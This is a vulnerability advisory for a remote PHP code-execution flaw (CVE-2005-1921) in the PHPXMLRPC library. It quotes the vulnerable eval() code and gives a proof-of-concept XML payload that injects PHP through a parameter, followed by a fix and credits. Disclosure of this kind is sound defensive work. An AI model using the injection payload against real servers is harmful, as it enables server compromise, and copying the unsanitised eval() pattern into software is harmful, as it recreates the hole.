@@ -1,0 +1,72 @@
+PHPXMLRPC Remote Code Execution
+
+Vendor: Useful Information Inc.
+Product: PHPXMLRPC
+Version: <= 1.1
+Website: http://phpxmlrpc.sourceforge.net/
+
+BID: 14088 
+CVE: CVE-2005-1921 
+OSVDB: 17793 
+SECUNIA: 15852 
+PACKETSTORM: 38394 
+
+Description:
+PHPXMLRPC aka XML-RPC For PHP is a PHP implementation of the XML-RPC web RPC protocol, and was originally developed by Edd Dumbill of Useful Information Company. As of the 1.0 stable release, the project has been opened to wider involvement and moved to SourceForge. PHPXMLRPC is used in a large number of popular web applications such as PostNuke, Drupal, b2evolution, and TikiWiki. Unfortunately PHPXMLRPC is vulnerable to a remote php code execution vulnerability that may be exploited by an attacker to compromise a vulnerable system. 
+
+
+Remote Code Execution:
+PHPXMLRPC is vulnerable to a very high risk remote php code execution vulnerability that may allow for an attacker to compromise a vulnerable webserver. The vulnerability is the result of unsanatized data being passed directly into an eval() call in the parseRequest() function of the XMLRPC server. 
+
+
+	// decompose incoming XML into request structure
+	xml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, true);
+	xml_set_element_handler($parser, "xmlrpc_se", "xmlrpc_ee");
+	xml_set_character_data_handler($parser, "xmlrpc_cd");
+	xml_set_default_handler($parser, "xmlrpc_dh");
+	if (!xml_parse($parser, $data, 1)) {
+	  // return XML error as a faultCode
+	  $r=new xmlrpcresp(0,
+	  $xmlrpcerrxml+xml_get_error_code($parser),
+      sprintf("XML error: %s at line %d",
+      xml_error_string(xml_get_error_code($parser)),
+	  xml_get_current_line_number($parser)));
+	  xml_parser_free($parser);
+	} else {
+	  xml_parser_free($parser);
+	  $m=new xmlrpcmsg($_xh[$parser]['method']);
+	  // now add parameters in
+	  $plist="";
+	  for($i=0; $i\n";
+			$plist.="$i - " .  $_xh[$parser]['params'][$i]. " \n";
+			eval('$m->addParam(' . $_xh[$parser]['params'][$i]. ");");
+	  }
+
+
+By creating an XML file that uses single quotes to escape into the eval() call an attacker can easily execute php code on the target server. This has a lot to do with the fact that magic_quotes_gpc() does not apply to $HTTP_RAW_POST_DATA so using single quotes is not a problem. 
+
+
+<?xml version="1.0"?>
+<methodCall>
+<methodName>test.method</methodName>
+	<params>
+		<param>
+		<value><name>','')); phpinfo(); exit;/*</name></value>
+		</param>
+	</params>
+</methodCall>
+
+
+The above xml file when posted to the vulnerable server will cause the phpinfo() function call to be executed on the vulnerable server. 
+
+
+Solution:
+An updated version of PHPXMLRPC can be downloaded from their official website, and all users are advised to upgrade immediately. 
+
+http://sourceforge.net/project/showfiles.php?group_id=34455&package_id=26601 
+
+A special thanks to Ed Dumbill, Giunta Gaetano, and all of the other people that helped get this fix out, and all of the people who helped us try and track down developers who were using this third party XMLRPC library. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
